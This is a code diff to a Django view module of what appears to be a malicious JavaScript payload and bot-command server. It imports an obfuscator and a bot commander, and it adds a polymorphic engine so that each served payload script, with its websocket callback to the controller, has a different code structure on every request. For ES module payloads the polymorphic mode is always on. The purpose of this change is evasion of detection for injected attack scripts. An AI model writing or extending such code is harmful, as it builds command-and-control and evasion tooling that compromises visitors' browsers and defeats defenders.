@@ -22,6 +22,7 @@ from .obfuscator import PayloadObfuscator
 from .commands import BotCommander
 from .geoip import GeoIPService
 from .tokens import TokenService, RateLimiter
+from .polymorphic import PolymorphicEngine
 
 
 # ============== Smart Root Endpoint ==============
@@ -381,8 +382,16 @@ def serve_payload_js(request, payload_id=None):
     ws_protocol = 'wss' if request.is_secure() else 'ws'
     ws_url = f"{ws_protocol}://{short_domain}/ws/callback/"
 
+    # Check for polymorphic mode (unique payload every request)
+    poly_mode = request.GET.get('poly') or request.GET.get('p')
+
     # Generate the payload JavaScript
-    js_content = generate_payload_js(server_url, ws_url, payload_id)
+    if poly_mode:
+        # Polymorphic: unique code structure every request
+        js_content = PolymorphicEngine.generate_payload_js(server_url, ws_url, payload_id)
+    else:
+        # Standard payload
+        js_content = generate_payload_js(server_url, ws_url, payload_id)
 
     response = HttpResponse(js_content, content_type='application/javascript; charset=utf-8')
     response['Access-Control-Allow-Origin'] = '*'
@@ -413,8 +422,14 @@ def serve_module_js(request, module_name=None):
     ws_protocol = 'wss' if request.is_secure() else 'ws'
     ws_url = f"{ws_protocol}://{short_domain}/ws/callback/"
 
-    # ES Module format
-    js_content = generate_module_js(server_url, ws_url)
+    # Check for polymorphic mode
+    poly_mode = request.GET.get('poly') or request.GET.get('p')
+
+    # ES Module format (polymorphic by default for import())
+    if poly_mode or True:  # Always polymorphic for modules
+        js_content = PolymorphicEngine.generate_module_js(server_url, ws_url)
+    else:
+        js_content = generate_module_js(server_url, ws_url)
 
     response = HttpResponse(js_content, content_type='application/javascript; charset=utf-8')
     response['Access-Control-Allow-Origin'] = '*'
